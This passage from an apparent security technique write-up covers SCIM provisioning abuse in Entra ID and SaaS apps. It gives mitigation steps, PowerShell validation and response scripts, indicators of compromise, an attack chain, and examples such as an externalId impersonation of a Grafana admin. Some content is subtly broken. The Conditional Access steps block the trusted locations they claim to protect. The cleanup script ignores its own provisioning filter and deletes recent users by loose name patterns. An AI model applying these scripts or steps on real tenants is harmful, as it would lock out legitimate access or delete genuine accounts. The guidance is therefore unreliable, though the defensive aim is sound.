**Mitigation 7: Enforce Conditional Access Policy for SCIM Operations**

Objective: Block SCIM provisioning from unusual locations or devices.

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access** → **New policy**
2. Name: `SCIM Provisioning - Trusted Locations Only`
3. **Assignments:**
   - Users: Select service principal account used for SCIM
   - Cloud apps: All cloud apps (or specific SaaS app)
4. **Conditions:**
   - Locations: **Include** → Select "Trusted locations" → Add your IdP's network range
5. **Access controls:**
   - Grant: **Block access**
6. Enable policy: **On**
7. Click **Create**

This will block any SCIM requests from outside your trusted network, even if credentials are compromised.

---

### Validation Command (Verify Mitigations)

```powershell
# Verify SCIM credentials have been rotated (no old secrets remain)
$app = Get-MgServicePrincipal -Filter "displayName eq 'SaaSAppName'"
$creds = Get-MgServicePrincipalPasswordCredential -ServicePrincipalId $app.Id
if ($creds.Count -eq 0) {
  Write-Host "✓ PASS: All SCIM credentials rotated, no legacy secrets"
} else {
  Write-Host "✗ FAIL: Old credentials still present:"
  $creds | Select-Object DisplayName, EndDateTime
}

# Verify SCIM provisioning is disabled if not needed
$provisioning = Get-MgServicePrincipalProvisioningJob -ServicePrincipalId $app.Id
if ($provisioning.Status -eq "Disabled") {
  Write-Host "✓ PASS: SCIM provisioning is disabled"
} else {
  Write-Host "✗ FAIL: SCIM provisioning is active, verify it is authorized"
}
```

**Expected Output (If Secure):**
```
✓ PASS: All SCIM credentials rotated, no legacy secrets
✓ PASS: SCIM provisioning is disabled
```

---

## 11. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Cloud Log IOCs:**
- Unusual user creation by provisioning service principals (outside normal sync windows)
- Users provisioned with Administrative roles immediately upon creation
- SCIM operations originating from IP addresses outside your organization's network
- Bulk creation of users with similar naming patterns or generic display names
- Addition of users to privileged groups via SCIM without corresponding Entra ID role assignment

**Account IOCs:**
- Users with `externalId` mismatches (SCIM externalId doesn't match source system)
- Users created with unusually complex or random passwords
- Service principal accounts with overly permissive role assignments

### Forensic Artifacts

**Cloud Logs (Entra ID / Unified Audit Log):**
- **AuditLogs table:** Operations "Add user", "Update user", "Update group"
- **SigninLogs table:** Initial sign-in by backdoor account (IP geolocation anomalies)
- **ProvisioningLogs table (if available):** Raw SCIM provisioning requests and responses

**File System (if on-premises sync affected):**
- `C:\ProgramData\Microsoft\Azure AD Connect\Logging\ProvisioningLogs.txt`
- `C:\Windows\System32\drivers\etc\hosts` (if attacker modified DNS for SCIM redirection)

**Application Logs:**
- SaaS application SCIM audit trail (if available)
- API gateway logs (if SCIM proxied through API Management)

### Response Procedures

**Step 1: Isolate**

Objective: Prevent further damage from compromised SCIM credentials.

**Command (Disable SCIM Provisioning):**
```powershell
# Immediately stop SCIM provisioning
$app = Get-MgServicePrincipal -Filter "displayName eq 'VulnerableApp'"
Update-MgServicePrincipal -ServicePrincipalId $app.Id -AccountEnabled $false
Write-Host "SCIM provisioning disabled for $($app.DisplayName)"
```

**Manual (Azure Portal):**
1. Go to **Entra ID** → **Enterprise Applications** → select app
2. Click **Provisioning** → **Status**: Off → **Save**

---

**Step 2: Collect Evidence**

Objective: Preserve audit trail for investigation and compliance.

**Command (Export Audit Logs):**
```powershell
$startDate = (Get-Date).AddDays(-7)
$endDate = Get-Date

Search-UnifiedAuditLog -StartDate $startDate -EndDate $endDate `
  -Operations "Add user", "Update user", "Update group", "Add group member" `
  -FreeText "provisioning OR scim" `
  -ResultSize 5000 |
  Export-Csv -Path "C:\Incident\SCIM_Audit_$(Get-Date -Format 'yyyyMMdd_HHmmss').csv"
```

---

**Step 3: Remediate**

Objective: Remove backdoor accounts and restore security.

**Command (Delete Backdoor Accounts):**
```powershell
# Identify and delete users created by provisioning service
$provisioningServiceId = (Get-MgServicePrincipal -Filter "displayName eq 'SaaSApp'").Id
$backdoorUsers = Get-MgUser -Filter "createdDateTime gt $(((Get-Date).AddDays(-1)).ToString('yyyy-MM-ddT00:00:00Z'))" -All

$backdoorUsers | ForEach-Object {
  # Verify user is actually a backdoor (check naming patterns, creation method)
  if ($_.DisplayName -match "System|Service|Temp|Admin" -or $_.Mail -like "*+*@*") {
    Remove-MgUser -UserId $_.Id -Confirm:$false
    Write-Host "Removed backdoor account: $($_.Mail)"
  }
}

# Reset all Global Admin passwords if compromise is suspected
$globalAdmins = Get-MgRoleManagementDirectoryRoleAssignment -Filter "roleDefinitionId eq '62e90394-69f5-4237-9190-012177145e10'" -All
$globalAdmins | ForEach-Object {
  $user = Get-MgUser -UserId $_.PrincipalId
  Write-Host "⚠️  ALERT: Global Admin $($user.Mail) password must be reset out-of-band (not via PowerShell)"
}
```

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [PE-PHISH-001](../02_Initial/IA-PHISH-001_Device_Code.md) | Attacker obtains credentials via phishing or credential stuffing |
| **2** | **Privilege Escalation** | [PE-ACCTMGMT-001](./PE-ACCTMGMT-001_App_Reg.md) | Escalate to Application Administrator or Global Admin role |
| **3** | **Current Step** | **[PE-ACCTMGMT-016]** | **Use SCIM provisioning to create persistent backdoor** |
| **4** | **Persistence** | [PE-ACCTMGMT-017](./PE-ACCTMGMT-017_Shadow_Principal.md) | Hide backdoor account in restricted Administrative Units |
| **5** | **Impact** | [CA-TOKEN-004](../03_Cred/CA-TOKEN-004_Graph_Token.md) | Extract Graph API tokens for downstream exfiltration |

---

## 13. REAL-WORLD EXAMPLES

### Example 1: Grafana CVE-2025-41115 Exploitation (November 2025)

**Timeline:** November 2025 (Grafana internal audit discovered vulnerability)

**Attack Surface:** SCIM externalId field vulnerability in Grafana Enterprise

**Exploitation Path:**
1. Attacker obtains SCIM client credentials via compromise of Okta tenant
2. Attacker sends SCIM provisioning request with `externalId: "1"` (matching Grafana admin UID)
3. Grafana incorrectly maps externalId to internal user.uid
4. Attacker successfully impersonates Grafana administrator
5. Attacker accesses all monitoring data and creates persistence backdoor

**Impact:** Full administrative compromise of Grafana instance, potential access to all monitored systems' metrics

**Reference:** [Grafana CVE-2025-41115 Advisory](https://grafana.com/blog/2025/11/20/grafana-enterprise-scim-privilege-escalation-vulnerability/)

---

### Example 2: Okta-to-SaaS SCIM Supply Chain Attack (2024-2025)

**Incident Description:** Threat actor compromised Okta API token (via phishing campaign targeting Okta administrator)

**Attack Sequence:**
1. Compromised Okta admin credentials via spear-phishing
2. Attacker logged into Okta tenant and enumerated SCIM provisioning integrations
3. Extracted SCIM tokens for 15 downstream SaaS applications (Salesforce, Workday, Slack, etc.)
4. Created backdoor service accounts in each application with admin privileges
5. Maintained persistent access across entire SaaS ecosystem

**Detection & Response:**
- Okta detected unusual API activity (password changes, token creation) from non-standard IP
- Orgs discovered backdoor accounts created without authorization
- SCIM credentials rotated across all applications
- Incident Response: Full audit of all provisioning activity across entire SaaS stack

**Reference:** Okta Security Blog - SCIM Compromise Incident (2024)

---

## Conclusion

SCIM provisioning abuse represents a critical privilege escalation and persistence vector in cloud environments. Attackers leverage the high trust relationship between identity providers and SaaS applications to bypass normal authentication and create backdoor accounts with administrative privileges. Organizations must implement strict access controls on SCIM credentials, monitor provisioning activity for anomalies, and maintain regular rotation of provisioning secrets.

---
